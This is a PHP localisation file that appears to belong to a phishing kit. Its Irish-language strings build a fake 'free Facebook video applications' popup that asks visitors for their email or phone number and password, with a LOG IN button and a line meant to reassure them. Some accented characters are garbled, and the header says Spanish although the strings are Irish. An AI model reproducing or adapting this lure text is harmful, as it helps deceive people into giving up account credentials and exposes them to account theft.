<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'ga';
 
// Fondo

$lang['TITULO_PAGINA'] = 'Facebook iarratas';
 
// Pop-UP
 
$lang['POPUP_TITULO'] = 'Facebook Video Iarratais (saor in aisce)';
$lang['POPUP_DESCRIPCION'] = '�FORGOT AN PASSWORD?';
$lang['POPUP_CORREO'] = 'R�omhphost n� ar an bhf�n';
$lang['POPUP_CONTRASENA'] = 'Pasfhocal';
$lang['POPUP_SUBMIT'] = 'LOG IN';
$lang['POPUP_CANDADO'] = 'N� h� seo an t-iarratas a cheada�tear a fhoilsi� ar Facebook.';

/*
$langGa = array("Ireland")
*/